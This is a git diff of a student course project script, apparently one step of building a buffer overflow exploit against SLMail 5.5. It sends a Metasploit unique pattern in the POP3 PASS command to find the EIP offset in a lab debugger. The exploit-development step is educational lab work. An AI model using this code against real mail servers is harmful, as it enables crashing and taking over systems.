@@ -1,14 +1,14 @@
-# Programming For Cybersecurity course - Project
-# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
+#  Programming For Cybersecurity course - Project
+#  Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
 #
-# Author: Tomasz
+#  Author: Tomasz / G00398835
 #
-#  We replace the buffer with a unique string of characters to identify a position of the EIP register.
-#  Kali Linux can help if you run "msf-pattern_create -l 4000".
-#  Once we have a uniqye buffer we send it again and observe SLMain attacher to a debugger (Immunity Debugger for example) 
-#  and take a note  of tge hex bytes stored in EIP register during the crash.
+#  We have to replace the buffer with a unique string of characters to identify a position the EIP register. This is an important register to control 
+#  workflow of execution of CPU instructions.
+#  Kali Linux can help if us to generated a unique string to fill up the buffer (including EIP) "msf-pattern_create -l 4000".
+#  Once we have a unique buffer we send it against the application and observe SLMain attached to a debugger in our lab environment (Immunity Debugger for example) 
+#  Once application crashed, take a note  of the hex bytes stored in EIP register during the crash.
 #
-
 
 import sys
 import socket
@@ -29,7 +29,7 @@ try:
     s.send('USER username'+'\r\n')                  # Send Username
     data = s.recv(1024)
     
-    s.send('PASS ' + buffer + '\r\n')             # Send Password and  buffer
+    s.send('PASS ' + unique_buf + '\r\n')             # Send Password and  buffer
     s.close()
 except:
-    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')
+    print('There was a problem! Please check your code and if the server is vulnerable and SLMail 5.5 is running on the target.')
